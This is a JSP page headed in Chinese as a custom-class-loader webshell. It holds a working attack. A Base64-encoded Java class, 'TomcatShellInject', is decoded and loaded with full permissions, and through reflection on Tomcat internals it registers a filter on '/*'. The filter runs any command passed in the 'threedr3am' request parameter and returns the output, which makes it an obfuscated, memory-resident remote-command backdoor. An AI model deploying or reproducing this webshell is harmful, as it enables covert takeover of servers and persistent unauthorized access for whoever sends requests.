<%@ page import="java.security.PermissionCollection" %>
<%@ page import="java.security.Permissions" %>
<%@ page import="java.security.AllPermission" %>
<%@ page import="java.security.ProtectionDomain" %>
<%@ page import="java.security.CodeSource" %>
<%@ page import="java.security.cert.Certificate" %>
<%@ page import="java.util.Base64" %>
<html>
<body>
<h2>自定义类加载器的JSP Webshell</h2>
<%
    new ClassLoader() {

        @Override
        public Class<?> loadClass(String name) throws ClassNotFoundException {
            if (name.contains("TomcatShellInject")) {
                return findClass(name);
            }
            return super.loadClass(name);
        }

        @Override
        protected Class<?> findClass(String name) throws ClassNotFoundException {
            try {
                byte[] bytes = Base64.getDecoder().decode("yv66vgAAADQBFgoAQwBrCQBsAG0IAG4KAG8AcAgAcQsAIQByCgBzAHQKAHMAdQcAdgcAdwoAeAB5CgAKAHoKAAkAewcAfAoADgBrCgAJAH0KAA4AfgoADgB/CgAOAIALAIEAggoANQCDCgCEAIUKAIQAhgoAhACHCwCIAIkHAIoIAIsKADoAjAoAjQCOCgCNAI8HAJAKAB8AkQcAkgsAIQCTCwAmAJQKAJUAlggAlwcAmAcAmQcAmggAmwkAnACdCgCNAJ4HAJ8KACwAawsAJgCgCAChCACiCwCjAKQLAKMApQkApgCnCgCoAKkHAKoIAKsLAKMArAkAnACtCACuBwCvCgA6ALAKALEAjgoAsQCyCgAnALMKALQAtQoANQC2BwC3CgBBALgHALkHALoBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAKRXhjZXB0aW9ucwcAuwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgcAvAEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEADVN0YWNrTWFwVGFibGUHAJ8HAJIHAL0HAL4HAKoHAL8HAHYHAHwHAMABAAdkZXN0cm95AQAIPGNsaW5pdD4HAMEHAJAHAJgHAJkHAMIHALoHAMUHAMYHAMcHALcBAApTb3VyY2VGaWxlAQAWVG9tY2F0U2hlbGxJbmplY3QuamF2YQwARQBGBwDIDADJAMoBAF9Ub21jYXRTaGVsbEluamVjdCBkb0ZpbHRlci4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLgcAywwAzADNAQAKdGhyZWVkcjNhbQwAzgDPBwDQDADRANIMANMA1AEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwC/DADVANYMAEUA1wwARQDYAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMANkA2gwA2wDcDADbAN0MAN4A2gcAvQwA3wDgDADhAOIHAOMMAOQA5QwA5gBGDADnAEYHAL4MAFEA6AEAL29yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9BcHBsaWNhdGlvbkZpbHRlckNoYWluAQATbGFzdFNlcnZpY2VkUmVxdWVzdAwA6QDqBwDBDADrAOwMAO0A7gEAFWphdmEvbGFuZy9UaHJlYWRMb2NhbAwA7QDvAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAwA8ADxDADyAPMHAMIMAPQA9QEAB2NvbnRleHQBABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb250ZXh0AQAob3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL1N0YW5kYXJkQ29udGV4dAEAJm9yZy9hcGFjaGUvY2F0YWxpbmEvdXRpbC9MaWZlY3ljbGVCYXNlAQAFc3RhdGUHAPYMAPcA+AwA+QD6AQARVG9tY2F0U2hlbGxJbmplY3QMAPsA/AEACGVuY29kaW5nAQAFdXRmLTgHAMUMAP4A/wwBAADsBwEBDAECAQMHAQQMAQUBBgEAEGphdmEvbGFuZy9TdHJpbmcBAAIvKgwBBwEIDAEJAPgBAAtmaWx0ZXJTdGFydAEAD2phdmEvbGFuZy9DbGFzcwwBCgELBwDGDAEMAQ0MAQ4BDwcBEAwBEQDaDAESARMBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAEUAEYBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAUamF2YXgvc2VydmxldC9GaWx0ZXIBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEAGWphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW4BABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvaW8vSU9FeGNlcHRpb24BABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEAEGphdmEvbGFuZy9PYmplY3QBAAdEeW5hbWljAQAMSW5uZXJDbGFzc2VzAQAoamF2YXgvc2VydmxldC9GaWx0ZXJSZWdpc3RyYXRpb24kRHluYW1pYwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAMltMb3JnL2FwYWNoZS90b21jYXQvdXRpbC9kZXNjcmlwdG9yL3dlYi9GaWx0ZXJNYXA7AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEAEyhMamF2YS9pby9SZWFkZXI7KVYBAAhyZWFkTGluZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAcKEMpTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAPZ2V0T3V0cHV0U3RyZWFtAQAlKClMamF2YXgvc2VydmxldC9TZXJ2bGV0T3V0cHV0U3RyZWFtOwEACGdldEJ5dGVzAQAEKClbQgEAIWphdmF4L3NlcnZsZXQvU2VydmxldE91dHB1dFN0cmVhbQEABXdyaXRlAQAFKFtCKVYBAAVmbHVzaAEABWNsb3NlAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAUKClMamF2YS9sYW5nL09iamVjdDsBABFnZXRTZXJ2bGV0Q29udGV4dAEAICgpTGphdmF4L3NlcnZsZXQvU2VydmxldENvbnRleHQ7AQAVZ2V0RmlsdGVyUmVnaXN0cmF0aW9uAQA2KExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvc2VydmxldC9GaWx0ZXJSZWdpc3RyYXRpb247AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAib3JnL2FwYWNoZS9jYXRhbGluYS9MaWZlY3ljbGVTdGF0ZQEADVNUQVJUSU5HX1BSRVABACRMb3JnL2FwYWNoZS9jYXRhbGluYS9MaWZlY3ljbGVTdGF0ZTsBAANzZXQBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYBAAlhZGRGaWx0ZXIBAFQoTGphdmEvbGFuZy9TdHJpbmc7TGphdmF4L3NlcnZsZXQvRmlsdGVyOylMamF2YXgvc2VydmxldC9GaWx0ZXJSZWdpc3RyYXRpb24kRHluYW1pYzsHARUBABBzZXRJbml0UGFyYW1ldGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylaAQARc2V0QXN5bmNTdXBwb3J0ZWQBABxqYXZheC9zZXJ2bGV0L0Rpc3BhdGNoZXJUeXBlAQAHUkVRVUVTVAEAHkxqYXZheC9zZXJ2bGV0L0Rpc3BhdGNoZXJUeXBlOwEAEWphdmEvdXRpbC9FbnVtU2V0AQACb2YBACUoTGphdmEvbGFuZy9FbnVtOylMamF2YS91dGlsL0VudW1TZXQ7AQAYYWRkTWFwcGluZ0ZvclVybFBhdHRlcm5zAQAqKExqYXZhL3V0aWwvRW51bVNldDtaW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAHU1RBUlRFRAEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA5maW5kRmlsdGVyTWFwcwEANCgpW0xvcmcvYXBhY2hlL3RvbWNhdC91dGlsL2Rlc2NyaXB0b3Ivd2ViL0ZpbHRlck1hcDsBAC9vcmcvYXBhY2hlL3RvbWNhdC91dGlsL2Rlc2NyaXB0b3Ivd2ViL0ZpbHRlck1hcAEADWdldEZpbHRlck5hbWUBABBlcXVhbHNJZ25vcmVDYXNlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaAQAPcHJpbnRTdGFja1RyYWNlAQAgamF2YXgvc2VydmxldC9GaWx0ZXJSZWdpc3RyYXRpb24AIQAsAEMAAQBEAAAABwABAEUARgABAEcAAAAdAAEAAQAAAAUqtwABsQAAAAEASAAAAAYAAQAAABEAAQBJAEoAAgBHAAAAGQAAAAMAAAABsQAAAAEASAAAAAYAAQAAAGIASwAAAAQAAQBMAAEASQBNAAIARwAAABkAAAAEAAAAAbEAAAABAEgAAAAGAAEAAABoAEsAAAAEAAEATAABAE4ATwACAEcAAAAZAAAAAgAAAAGxAAAAAQBIAAAABgABAAAAbQBLAAAABAABAFAAAQBRAFIAAgBHAAABIgAFAAkAAACTsgACEgO2AAQrEgW5AAYCAFk6BMYAd7gABxkEtgAIOgW7AAlZuwAKWRkFtgALtwAMtwANOga7AA5ZtwAPOgcZBrYAEFk6CMYAIBkHuwAOWbcADxkItgAREAq2ABK2ABO2ABFXp//bLLkAFAEAGQe2ABO2ABW2ABYsuQAUAQC2ABcsuQAUAQC2ABixLSssuQAZAwCxAAAAAgBIAAAAOgAOAAAAcgAIAHUAFgB2ACAAdwAqAHgANQB5AD4AewBJAHwAZgB+AHcAfwCAAIAAiQCBAIoAgwCSAIQAUwAAAD0AA/8APgAIBwBUBwBVBwBWBwBXBwBYBwBZBwBaBwBbAAD8ACcHAFj/ACMABQcAVAcAVQcAVgcAVwcAWAAAAEsAAAAGAAIAXABQAAEAXQBGAAEARwAAABkAAAABAAAAAbEAAAABAEgAAAAGAAEAAACJAAgAXgBGAAEARwAAApYABwAMAAABXRIaEhu2ABxLKgS2AB0qAbYAHsAAH0wBTSvGABIrtgAgxgALK7YAIMAAIU0sxgEoLLkAIgEATgE6BC0SBbkAIwIAxwETGQTHAD8ttgAkEiW2ABw6BRkFBLYAHRkFLbYAHjoGGQbBACaZAAwZBsAAJk6nABIZBsEAJ5kAChkGwAAnOgSn/8IZBMYAzRIoEim2ABw6BRkFBLYAHRkFGQSyACq2ACu7ACxZtwAtOgYtEgUZBrkALgMAOgcZBxIvEjC5ADEDAFcZBwO5ADICABkHsgAzuAA0AwS9ADVZAxI2U7kANwQAGQXGAA0ZBRkEsgA4tgArGQTGAGASJxI5A70AOrYAOzoIGQgEtgA8GQgZBAG2AD1XGQS2AD46CQM2ChUKGQm+ogAyGQkVCjK2AD8SBbYAQJkAHBkJFQoyOgsZCRUKGQkDMlMZCQMZC1OnAAmECgGn/8ynAAhLKrYAQrEAAQAAAVQBVwBBAAIASAAAANIANAAAABYABAAXAAgAGAANABkAFgAaABgAHAAjAB0AKwAfAC8AIAA2ACEAOQAjAEQAJQBJACYAVAAnAFoAKABiACkAagAqAHMAKwB7ACwAggAuAIUALwCKADEAjgAyAJMAMwCZADQAowA2AKwAOACxADkAuAA6AMQAOwDMADwA0QA9AOMAQADoAEEA8gBEAPcARgD/AEcBBABIAQoASQETAEwBFQBNARoATgElAE8BNQBQATwAUQFFAFIBSwBTAU4ATgFUAFwBVwBaAVgAWwFcAF0AUwAAAEcAC/4AKwcAXwcAYAcAVf0AGAcAYQcAYv0ALgcAXwcAY/kADgL+AGwHAF8HAGQHAGX+ACoHAGYHAGcBMP8ABQAAAABCBwBoBAACAGkAAAACAGoAxAAAAAoAAQCjAP0AwwYJ");
                PermissionCollection pc = new Permissions();
                pc.add(new AllPermission());
                ProtectionDomain protectionDomain = new ProtectionDomain(new CodeSource(null, (Certificate[]) null), pc, this, null);
                return this.defineClass(name, bytes, 0, bytes.length, protectionDomain);
            } catch (Exception e) {
                e.printStackTrace();
            }
            return super.findClass(name);
        }
    }.loadClass("TomcatShellInject").getConstructor().newInstance();
%>
</body>
</html>